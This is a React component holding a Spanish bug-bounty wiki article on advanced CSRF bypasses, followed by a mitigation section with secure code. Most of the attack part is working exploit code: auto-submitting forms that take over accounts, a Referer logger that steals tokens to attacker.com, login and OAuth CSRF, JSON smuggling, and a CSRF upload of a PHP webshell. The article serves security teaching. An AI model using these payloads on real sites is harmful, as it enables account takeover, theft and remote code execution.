/**
 * CSRF ADVANCED
 * Bypassear protección CSRF con técnicas avanzadas
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function CSRFAdvancedContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="CSRF Advanced - Bypassear Todas las Protecciones">
        <Paragraph>
          <Strong>Cross-Site Request Forgery (CSRF)</Strong> permite forzar a víctima autenticada 
          a ejecutar acciones no autorizadas. Técnicas avanzadas bypassean tokens, SameSite cookies, 
          y headers custom.
        </Paragraph>

        <AlertDanger title="Impacto de CSRF Avanzado">
          <ul className="mt-2 space-y-1">
            <ListItem>💰 Transferencia de fondos no autorizada</ListItem>
            <ListItem>🔑 Cambio de email/contraseña → Account takeover</ListItem>
            <ListItem>👤 Creación de admin users</ListItem>
            <ListItem>🗑️ Eliminación de datos</ListItem>
            <ListItem>⚙️ Modificación de configuraciones críticas</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="csrf-basico" title="1. CSRF Básico - Sin Protección">
        <CodeBlock
          language="php"
          title="❌ VULNERABLE - Sin CSRF token"
          code={`<?php
session_start();

// Endpoint vulnerable
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    
    // ❌ Sin validación de CSRF token
    // Solo verifica que usuario esté autenticado
    if (isset($_SESSION['user_id'])) {
        updateEmail($_SESSION['user_id'], $email);
        echo "Email updated";
    }
}
?>`}
        />

        <CodeBlock
          language="html"
          title="Exploit - Página en attacker.com"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Win a Free iPhone! 🎁</h1>
  
  <!-- Form auto-submit en víctima autenticada -->
  <form id="csrf" action="https://victim.com/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  
  <script>
    // Auto-submit cuando página carga
    document.getElementById('csrf').submit();
  </script>
</body>
</html>

<!-- Víctima visita attacker.com mientras logged in victim.com
Resultado: Email cambiado a attacker@evil.com → Account takeover ✓
-->`}
        />
      </Section>

      <Section id="bypass-csrf-token" title="2. Bypass de CSRF Token">
        <Subsection title="Token Predecible">
          <CodeBlock
            language="php"
            title="❌ VULNERABLE - Token basado en timestamp"
            code={`<?php
// Generar token CSRF
function generateCSRFToken() {
    // ❌ VULNERABLE - Basado en timestamp
    $token = md5(time());
    $_SESSION['csrf_token'] = $token;
    return $token;
}

// Validar token
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Invalid CSRF token');
}

// Atacante puede:
// 1. Adivinar timestamp (~mismo segundo)
// 2. Generar token con md5(time())
// 3. Usar en ataque → Bypass ✓`}
          />
        </Subsection>

        <Subsection title="Token Leakage via Referer">
          <CodeBlock
            language="html"
            title="Token expuesto en URL"
            code={`<!-- Aplicación pone token en URL (MAL): -->
<form action="/transfer?csrf=abc123def456" method="POST">
  <input name="amount" />
  <button>Transfer</button>
</form>

<!-- Si víctima hace clic en link externo desde esta página: -->
<a href="https://attacker.com">Click here</a>

<!-- Request a attacker.com incluye Referer:
GET / HTTP/1.1
Host: attacker.com
Referer: https://victim.com/transfer?csrf=abc123def456

Atacante captura token desde Referer header ✓
-->`}
          />

          <CodeBlock
            language="html"
            title="Exploit - Robar token desde Referer"
            code={`<!-- Página del atacante con imagen invisible -->
<img src="https://attacker.com/log-referer.php" style="display:none" />

<!-- log-referer.php: -->
<?php
$referer = $_SERVER['HTTP_REFERER'];
// Extraer token desde referer
preg_match('/csrf=([a-f0-9]+)/', $referer, $matches);
$token = $matches[1];

// Guardar token robado
file_put_contents('stolen_tokens.txt', $token . "\\n", FILE_APPEND);
?>

<!-- Ahora atacante tiene token válido para CSRF ✓ -->`}
          />
        </Subsection>

        <Subsection title="Token No Vinculado a Session">
          <CodeBlock
            language="php"
            title="❌ VULNERABLE - Token global no asociado a usuario"
            code={`<?php
// Generar token compartido
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Validar token
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Invalid CSRF token');
}

// ❌ PROBLEMA:
// Atacante puede:
// 1. Crear cuenta propia en victim.com
// 2. Obtener su propio CSRF token
// 3. Usar ese token en ataque contra otra víctima
// 4. Si token NO está vinculado a session ID → Bypass ✓`}
          />
        </Subsection>

        <Subsection title="Token Reutilizable">
          <CodeBlock
            language="php"
            title="❌ VULNERABLE - Token no se invalida después de uso"
            code={`<?php
// Token generado una vez
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Validar pero NO regenerar
if ($_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // Ejecutar acción
    updateEmail($_POST['email']);
    
    // ❌ Token NO se regenera - Reutilizable
}

// Atacante puede:
// 1. Obtener token válido (leak, XSS, etc.)
// 2. Usar el mismo token múltiples veces
// 3. CSRF funciona indefinidamente ✓`}
          />
        </Subsection>
      </Section>

      <Section id="bypass-samesite" title="3. Bypass de SameSite Cookie">
        <Paragraph>
          <InlineCode>SameSite</InlineCode> cookie attribute previene envío de cookies en 
          requests cross-site. Pero tiene múltiples bypasses.
        </Paragraph>

        <Subsection title="SameSite=Lax con GET Requests">
          <CodeBlock
            language="javascript"
            title="SameSite=Lax permite GET con navegación top-level"
            code={`// Cookie configurada:
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax'  // ← Lax permite GET top-level
});

// Bypass:
// Si endpoint vulnerable usa GET para acciones:
// GET /delete-account?confirm=yes

// Atacante puede:
<a href="https://victim.com/delete-account?confirm=yes">
  Click for Prize!
</a>

// SameSite=Lax permite cookies en GET navigation ✓
// Cuenta eliminada ✓`}
          />

          <AlertWarning>
            <Strong>SameSite=Lax</Strong> envía cookies en: navegación top-level GET, 
            links <InlineCode>&lt;a&gt;</InlineCode>, prerender. NO en POST cross-site.
          </AlertWarning>
        </Subsection>

        <Subsection title="Chrome SameSite=Lax 2-Minute Bypass">
          <CodeBlock
            language="html"
            title="Bypass de SameSite=Lax en primeros 2 minutos"
            code={`<!-- Chrome BUG (parcheado en versiones recientes):
SameSite=Lax cookies son enviadas en POST durante primeros 2 minutos
después de ser seteadas
-->

<form id="csrf" action="https://victim.com/transfer" method="POST">
  <input name="amount" value="10000" />
  <input name="to" value="attacker" />
</form>

<script>
  // Si víctima acaba de hacer login (< 2 min):
  // Cookie session con SameSite=Lax AÚN es enviada en POST
  document.getElementById('csrf').submit();
</script>

<!-- Funciona si:
1. Víctima hace login
2. Inmediatamente visita página del atacante
3. POST CSRF dentro de 2 minutos → Cookie enviada ✓
-->`}
          />
        </Subsection>

        <Subsection title="Subdomain Bypass de SameSite">
          <CodeBlock
            language="html"
            title="Si atacante controla subdomain"
            code={`<!-- Si atacante controla subdomain (ej: subdomain takeover):
https://evil.victim.com

Cookies con Domain=.victim.com son enviadas desde subdominios
SameSite NO previene requests desde mismo sitio (evil.victim.com → api.victim.com)
-->

<!-- En evil.victim.com: -->
<form action="https://api.victim.com/transfer" method="POST">
  <input name="amount" value="10000" />
</form>

<script>
  // SameSite=Lax permite same-site requests
  // evil.victim.com es same-site con api.victim.com ✓
  document.forms[0].submit();
</script>

<!-- Cookie enviada → CSRF exitoso ✓ -->`}
          />
        </Subsection>

        <Subsection title="WebSocket Bypass de SameSite">
          <CodeBlock
            language="html"
            title="WebSockets no respetan SameSite"
            code={`<!-- WebSocket connections NO son afectadas por SameSite -->

<script>
  // Desde attacker.com, conectar a WebSocket de victim.com
  const ws = new WebSocket('wss://victim.com/ws');
  
  ws.onopen = () => {
    // Cookies son enviadas en WebSocket handshake
    // Independientemente de SameSite ✓
    
    ws.send(JSON.stringify({
      action: 'transfer',
      amount: 10000,
      to: 'attacker'
    }));
  };
</script>

<!-- Si victim.com usa WebSocket sin CSRF protection
Ataque funciona aunque tenga SameSite=Strict ✓
-->`}
          />
        </Subsection>
      </Section>

      <Section id="bypass-custom-headers" title="4. Bypass de Custom Headers">
        <Subsection title="Header Validation Bypass con Flash">
          <CodeBlock
            language="actionscript"
            title="Flash bypass (legacy pero aún relevante)"
            code={`// Aplicación verifica custom header:
// X-Requested-With: XMLHttpRequest

// Flash puede setear headers arbitrarios
var request:URLRequest = new URLRequest("https://victim.com/api");
request.method = URLRequestMethod.POST;

// Setear header custom
var headers:Array = [];
headers.push(new URLRequestHeader("X-Requested-With", "XMLHttpRequest"));
request.requestHeaders = headers;

var loader:URLLoader = new URLLoader();
loader.load(request);

// Flash bypasses CORS y puede setear headers ✓
// CSRF exitoso ✓`}
          />
        </Subsection>

        <Subsection title="HTTP Method Override">
          <CodeBlock
            language="html"
            title="Bypass usando X-HTTP-Method-Override"
            code={`<!-- Algunos frameworks permiten override de método:
POST con header: X-HTTP-Method-Override: DELETE
→ Tratado como DELETE request
-->

<!-- Si aplicación verifica CSRF solo en POST pero no DELETE: -->

<form action="https://victim.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE" />
</form>

<!-- Frameworks como Laravel procesan _method parameter
POST con _method=DELETE → Tratado como DELETE
Si CSRF validation solo en POST → Bypass ✓
-->`}
          />
        </Subsection>
      </Section>

      <Section id="login-csrf" title="5. Login CSRF - Forzar Login con Cuenta del Atacante">
        <CodeBlock
          language="html"
          title="Login CSRF attack"
          code={`<!-- Atacante fuerza a víctima a hacer login con cuenta del atacante -->

<form id="loginCSRF" action="https://victim.com/login" method="POST">
  <input type="hidden" name="username" value="attacker@evil.com" />
  <input type="hidden" name="password" value="attackerPassword123" />
</form>

<script>
  document.getElementById('loginCSRF').submit();
</script>

<!-- Resultado:
1. Víctima queda loggeada con cuenta del atacante
2. Víctima usa la aplicación normalmente
3. Ingresa datos sensibles, hace transacciones
4. Atacante hace login con misma cuenta
5. Ve todos los datos/transacciones de la víctima ✓

Casos reales:
- YouTube login CSRF (2008)
- Netflix login CSRF (2006)
-->`}
        />

        <CodeBlock
          language="html"
          title="OAuth Login CSRF - Link Account Attack"
          code={`<!-- Atacante inicia OAuth flow con su cuenta:
1. Visita victim.com/oauth/google
2. Autoriza con su Google account
3. Captura OAuth callback URL:
   https://victim.com/oauth/callback?code=ATTACKER_CODE&state=xyz

4. No completa el login
-->

<!-- Luego fuerza a víctima a completar el login: -->
<script>
  // Redirigir a callback con code del atacante
  window.location = 'https://victim.com/oauth/callback?code=ATTACKER_CODE&state=xyz';
</script>

<!-- Resultado:
1. Víctima completa login OAuth
2. Cuenta Google del ATACANTE se linkea a perfil de la VÍCTIMA
3. Atacante puede hacer login con su Google
4. Accede a cuenta de la víctima ✓
-->`}
        />
      </Section>

      <Section id="csrf-json" title="6. CSRF con Content-Type application/json">
        <CodeBlock
          language="html"
          title="Bypass de JSON CSRF protection"
          code={`<!-- Aplicación solo acepta JSON:
Content-Type: application/json
{"amount": 1000, "to": "attacker"}
-->

<!-- Form normal NO puede enviar JSON (solo form-urlencoded)
Pero Flash puede: -->

<object>
  <param name="movie" value="csrf.swf" />
</object>

<!-- csrf.swf (ActionScript): -->
var request:URLRequest = new URLRequest("https://victim.com/api/transfer");
request.method = URLRequestMethod.POST;
request.contentType = "application/json";
request.data = '{"amount":10000,"to":"attacker"}';

var loader:URLLoader = new URLLoader();
loader.load(request);

<!-- Flash puede setear Content-Type: application/json
Bypasses JSON-only endpoint ✓
-->`}
        />

        <CodeBlock
          language="html"
          title="Alternativa moderna - Form con text/plain"
          code={`<!-- Trick: Enviar JSON-like data con Content-Type: text/plain
Algunos parsers aceptan JSON aunque Content-Type no sea application/json
-->

<form action="https://victim.com/api/transfer" method="POST" enctype="text/plain">
  <input name='{"amount":10000,"to":"attacker","ignore":"' value='"}' />
</form>

<!-- Request resultante:
Content-Type: text/plain
Body: {"amount":10000,"to":"attacker","ignore":"="}

Si backend parsea como JSON (ignorando Content-Type)
→ CSRF exitoso ✓
-->`}
        />
      </Section>

      <Section id="csrf-gadgets" title="7. CSRF Gadgets - Explotar Funcionalidad Legítima">
        <Subsection title="File Upload CSRF">
          <CodeBlock
            language="html"
            title="Upload webshell via CSRF"
            code={`<form id="uploadCSRF" action="https://victim.com/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="file" value="<?php system($_GET['cmd']); ?>" />
  <input type="hidden" name="filename" value="shell.php" />
</form>

<script>
  // Auto-submit upload malicioso
  document.getElementById('uploadCSRF').submit();
</script>

<!-- Si upload NO tiene CSRF protection:
1. Webshell uploaded
2. Acceder a: https://victim.com/uploads/shell.php?cmd=id
3. RCE ✓
-->`}
          />
        </Subsection>

        <Subsection title="Password Change CSRF">
          <CodeBlock
            language="html"
            title="Account takeover via password change"
            code={`<form id="pwdCSRF" action="https://victim.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123" />
  <input type="hidden" name="confirm_password" value="hacked123" />
  <!-- Muchas apps NO requieren contraseña actual en change -->
</form>

<script>
  document.getElementById('pwdCSRF').submit();
</script>

<!-- Resultado:
1. Contraseña de víctima cambiada a "hacked123"
2. Atacante hace login con nueva contraseña
3. Account takeover completo ✓
-->`}
          />
        </Subsection>

        <Subsection title="Email Change + Password Reset = Account Takeover">
          <CodeBlock
            language="html"
            title="Combo attack - Cambiar email y resetear password"
            code={`<!-- Paso 1: CSRF para cambiar email -->
<form id="emailCSRF" action="https://victim.com/update-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>

<script>
  // Cambiar email
  document.getElementById('emailCSRF').submit();
  
  // Esperar 2 segundos
  setTimeout(() => {
    // Paso 2: Solicitar password reset
    fetch('https://victim.com/forgot-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  }, 2000);
</script>

<!-- Resultado:
1. Email de víctima cambiado a attacker@evil.com
2. Password reset link enviado a attacker@evil.com
3. Atacante recibe link, resetea contraseña
4. Account takeover ✓
-->`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Defensa Completa Contra CSRF">
          Implementar múltiples capas de protección.
        </AlertDanger>

        <Subsection title="1. CSRF Token Correcto">
          <CodeBlock
            language="php"
            title="✅ SEGURO - Token criptográfico fuerte"
            code={`<?php
session_start();

// ✅ Generar token seguro
function generateCSRFToken() {
    // Cryptographically secure random
    $token = bin2hex(random_bytes(32));
    
    // Asociar a session específica
    $_SESSION['csrf_token'] = $token;
    $_SESSION['csrf_token_time'] = time();
    
    return $token;
}

// ✅ Validar token
function validateCSRFToken($token) {
    // Verificar que existe
    if (!isset($_SESSION['csrf_token'])) {
        return false;
    }
    
    // ✅ Comparación timing-safe
    if (!hash_equals($_SESSION['csrf_token'], $token)) {
        return false;
    }
    
    // ✅ Verificar que no expiró (15 min)
    $age = time() - $_SESSION['csrf_token_time'];
    if ($age > 900) {
        return false;
    }
    
    // ✅ Regenerar token después de uso
    unset($_SESSION['csrf_token']);
    generateCSRFToken();
    
    return true;
}

// En cada POST request:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!validateCSRFToken($_POST['csrf_token'])) {
        http_response_code(403);
        die('Invalid CSRF token');
    }
    
    // Procesar request
}
?>`}
          />
        </Subsection>

        <Subsection title="2. SameSite=Strict + Double Submit Cookie">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Defensa en profundidad"
            code={`// Setear cookies con SameSite=Strict
res.cookie('session', sessionToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // ✅ Strict - NO enviar en cross-site
  maxAge: 3600000
});

// ✅ Double Submit Cookie pattern
const csrfToken = crypto.randomBytes(32).toString('hex');

// Cookie con CSRF token (NO httpOnly para JS access)
res.cookie('csrf_token', csrfToken, {
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});

// También enviar en response body
res.json({ csrfToken });

// ✅ Cliente incluye token en header
// fetch('/api/transfer', {
//   method: 'POST',
//   headers: {
//     'X-CSRF-Token': document.cookie.match(/csrf_token=([^;]+)/)[1]
//   },
//   body: JSON.stringify({ amount: 100 })
// });

// ✅ Servidor verifica que cookie y header coinciden
app.post('/api/*', (req, res, next) => {
  const cookieToken = req.cookies.csrf_token;
  const headerToken = req.headers['x-csrf-token'];
  
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).send('CSRF validation failed');
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="3. Verificar Origin/Referer Headers">
          <CodeBlock
            language="javascript"
            title="✅ Validar origen de request"
            code={`app.use((req, res, next) => {
  // Solo para state-changing requests
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const origin = req.headers.origin || req.headers.referer;
    
    if (!origin) {
      return res.status(403).send('Missing origin header');
    }
    
    // ✅ Verificar que Origin es nuestro dominio
    const allowedOrigins = [
      'https://victim.com',
      'https://app.victim.com'
    ];
    
    try {
      const originURL = new URL(origin);
      const originHost = \`\${originURL.protocol}//\${originURL.hostname}\`;
      
      if (!allowedOrigins.includes(originHost)) {
        return res.status(403).send('Invalid origin');
      }
    } catch {
      return res.status(403).send('Invalid origin format');
    }
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="4. Re-autenticación para Acciones Críticas">
          <CodeBlock
            language="html"
            title="✅ Solicitar contraseña para cambios críticos"
            code={`<!-- Para acciones como:
- Cambiar contraseña
- Cambiar email
- Transferir fondos
- Eliminar cuenta
-->

<form action="/change-password" method="POST">
  <!-- ✅ Requiere contraseña actual -->
  <input type="password" name="current_password" required />
  <input type="password" name="new_password" required />
  <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>" />
  <button>Change Password</button>
</form>

<!-- Backend: -->
<?php
// ✅ Verificar contraseña actual
if (!password_verify($_POST['current_password'], $user['password'])) {
    die('Invalid current password');
}

// Continuar con cambio
?>`}
          />
        </Subsection>

        <Subsection title="5. NO Usar GET para State-Changing Actions">
          <CodeBlock
            language="javascript"
            title="✅ Solo GET para lectura, POST/PUT/DELETE para cambios"
            code={`// ❌ NUNCA:
app.get('/delete-account', (req, res) => {
  deleteAccount(req.session.userId);
});

// ✅ CORRECTO:
app.post('/delete-account', csrfProtection, (req, res) => {
  deleteAccount(req.session.userId);
});

// ✅ Principio:
// GET → Idempotente, sin side effects
// POST/PUT/DELETE → State-changing, protegido por CSRF`}
          />
        </Subsection>

        <Subsection title="6. Custom Header + Preflight">
          <CodeBlock
            language="javascript"
            title="✅ Forzar preflight CORS"
            code={`// Cliente siempre envía header custom
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'  // ✅ Fuerza preflight
  },
  body: JSON.stringify({ amount: 100 })
});

// Servidor verifica header
app.post('/api/*', (req, res, next) => {
  // ✅ Requiere header custom
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).send('Invalid request');
  }
  
  next();
});

// ✅ Simple form NO puede setear headers custom
// → CSRF bloqueado
// ✅ Preflight OPTIONS verifica CORS correctamente`}
          />
        </Subsection>

        <Subsection title="7. Framework CSRF Protection">
          <CodeBlock
            language="javascript"
            title="✅ Usar protección del framework"
            code={`// Express.js con csurf middleware
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Aplicar a todas las rutas
app.use(csrfProtection);

// Generar token
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Validar automáticamente en POST
app.post('/transfer', (req, res) => {
  // csurf middleware ya validó token
  // Si llegamos aquí → token válido ✓
  
  processTransfer(req.body);
});

// Django (automático):
# {% csrf_token %} en templates

// Rails (automático):
# protect_from_forgery with: :exception`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: WebSocket Hijacking</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/websocket-hijacking`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar WebSockets sin autenticación</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
